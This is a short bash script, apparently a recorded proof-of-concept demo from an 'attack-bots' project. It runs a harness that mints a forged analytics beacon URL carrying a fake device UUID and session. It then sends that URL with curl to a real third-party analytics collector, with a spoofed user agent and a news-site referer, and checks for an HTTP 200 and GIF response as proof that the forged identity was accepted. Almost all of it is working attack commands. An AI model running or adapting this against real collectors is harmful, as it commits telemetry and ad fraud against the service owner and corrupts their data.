#!/usr/bin/env bash
# sift-demo.sh — clean Sift forge demo: mint + send + acceptance (recorded)
set -uo pipefail
cd ~/Dev/ms-argus-attack-bots
echo "=== SIFT BEACON FORGE DEMO ==="
node bots/sift-forge-harness.mjs 2>/dev/null | grep -E "minted|forged|POSTING" | head -8
URL=$(cat /tmp/opencode/sift-forged-url.txt 2>/dev/null)
echo ""
echo "=== sending forged beacon to collector ==="
echo "UUID:    $(echo "$URL" | grep -oE 'uu=[a-f0-9-]+')"
echo "SESSION: $(echo "$URL" | grep -oE 'S=[a-f0-9]{32}')"
curl -s --resolve hexagon-analytics.com:443:34.102.249.210 -A "Mozilla/5.0" -e "https://www.ksl.com/" \
  -w 'COLLECTOR: HTTP %{http_code} | %{size_download} bytes | %{content_type}' -o /dev/null "$URL" 2>/dev/null
echo ""
echo "=== response body head (GIF89a = accepted) ==="
curl -s --resolve hexagon-analytics.com:443:34.102.249.210 -A "Mozilla/5.0" -e "https://www.ksl.com/" -o /tmp/opencode/sift-proof2.gif "$URL" 2>/dev/null
xxd -l 8 /tmp/opencode/sift-proof2.gif | head -1
echo "PROOF: forged device identity accepted by collector (HTTP 200 + GIF89a)"
